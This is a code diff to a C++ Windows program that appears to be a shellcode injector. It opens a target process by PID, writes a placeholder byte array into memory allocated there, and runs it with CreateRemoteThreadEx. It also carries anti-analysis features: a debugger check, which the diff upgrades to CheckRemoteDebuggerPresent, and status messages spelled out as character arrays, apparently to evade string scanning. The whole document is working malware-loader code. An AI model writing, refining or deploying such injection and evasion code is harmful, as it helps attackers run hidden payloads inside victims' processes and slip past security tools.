@@ -1,12 +1,14 @@
 #include <cstdio>
 #include <Windows.h>
 
+
 DWORD dwPID = 0;	//32 bit unsigned int 
 
 //put your data here in the 0x00,0x00 format
 const UCHAR MY_Data[] = { 0 };
 
 SIZE_T szMY_Data = sizeof(MY_Data);
+
 
 int do_sleep() {
 	DWORD sleep_time = 1000000;
@@ -17,12 +19,15 @@ int do_sleep() {
 
 int main(int argc, char* argv[]) {
 
-	if (IsDebuggerPresent() != 0) {
-		char string[] = {'D', 'e', 'b', 'u', 'g', 'g', 'e', 'r', ' ', 'D', 'e', 't', 'e', 'c', 't', 'e', 'd', '\0'};
+	BOOL bDebuggerPresent;
+	if (TRUE == CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebuggerPresent) && TRUE == bDebuggerPresent) {
+		char string[] = { 'R', 'e', 'm', 'o', 't', 'e', 'D', 'e', 'b', 'u', 'g', 'g', 'e', 'r', ' ', 'D', 'e', 't', 'e', 'c', 't', 'e', 'd', '\0' };
 		printf("[!] %s", string);
 		do_sleep();
 		return EXIT_FAILURE;
+
 	}
+	
 
 	//Ensure user supplied PID at the command line 
 	if (argc < 2) {
@@ -40,7 +45,7 @@ int main(int argc, char* argv[]) {
 		//Did the user give us a pid at a high privelege level
 		if (GetLastError() == ERROR_ACCESS_DENIED) {
 			char fail[] = { 'A','c','c','e','s','s',' ','D','e','n','i','e','d','\0' };
-			printf("[!] %s\n", fail);
+			printf("[!] %s\n", (char *)fail);
 			return EXIT_FAILURE;
 		}
 		//Did the user give us a pid that does not exist
@@ -53,7 +58,7 @@ int main(int argc, char* argv[]) {
 			//Everything went well and we got a handle to the specified process 
 			//printf("[!] Failed to GetHandle: 0x%p\n", GetLastError());
 			char no_handle[] = { 'F','a','i','l','e','d',' ','t','o',' ','G','e','t','H','a','n','d','l','e','\0' };
-			printf("[!] %s: 0x%p\n", no_handle, GetLastError());
+			printf("[!] %s: 0x%p\n", no_handle, (void *)GetLastError());
 			return EXIT_FAILURE;
 		}
 	}
@@ -81,7 +86,7 @@ int main(int argc, char* argv[]) {
 		}
 		else {
 			char no_memory[] = { 'F','a','i','l','e','d',' ','t','o',' ','a','l','l','o','c','a','t','e',' ','m','e','m','o','r','y','\0' };
-			printf("[!] %s: 0x%p\n", no_memory, GetLastError());
+			printf("[!] %s: 0x%p\n", no_memory, (void *)GetLastError());
 			if (handle) {
 				char close_handle[] = { 'C','l','o','s','i','n','g',' ','H','a','n','d','l','e',' ','t','o',' ','P','r','o','c','e','s','s','\0' };
 				printf("[+] %s\n", close_handle);
@@ -107,7 +112,7 @@ int main(int argc, char* argv[]) {
 	}
 	else {
 		char failed_write[] = { 'F','a','i','l','e','d',' ','t','o',' ','w','r','i','t','e',' ','d','a','t','a',' ','i','n','t','o',' ','t','a','r','g','e','t',' ','p','r','o','c','e','s','s',' ','m','e','m','o','r','y','\0' };
-		printf("[!] %s: 0x%p\n", failed_write, GetLastError());
+		printf("[!] %s: 0x%p\n", failed_write, (void *)GetLastError());
 		return EXIT_FAILURE;
 	}
 
@@ -130,7 +135,7 @@ int main(int argc, char* argv[]) {
 	HANDLE cThread = CreateRemoteThreadEx(handle, NULL, 0, (LPTHREAD_START_ROUTINE)myAllocation, NULL, 0, NULL, NULL);
 	if (cThread == NULL) {
 		char failed_thread[] = { 'C','o','u','l','d',' ','n','o','t',' ','c','r','e','a','t','e',' ','T','h','r','e','a','d',' ','i','n',' ','p','r','o','c','e','s','s','\0' };
-		printf("[!] %s: 0x%p\n", failed_thread, GetLastError());
+		printf("[!] %s: 0x%p\n", failed_thread, (void *)GetLastError());
 		if (cThread) {
 			char k_thread[] = { 'K','i','l','l','i','n','g',' ','I','n','j','e','c','t','e','d',' ','T','h','r','e','a','d','\0' };
 			printf("[+] %s\n", k_thread);
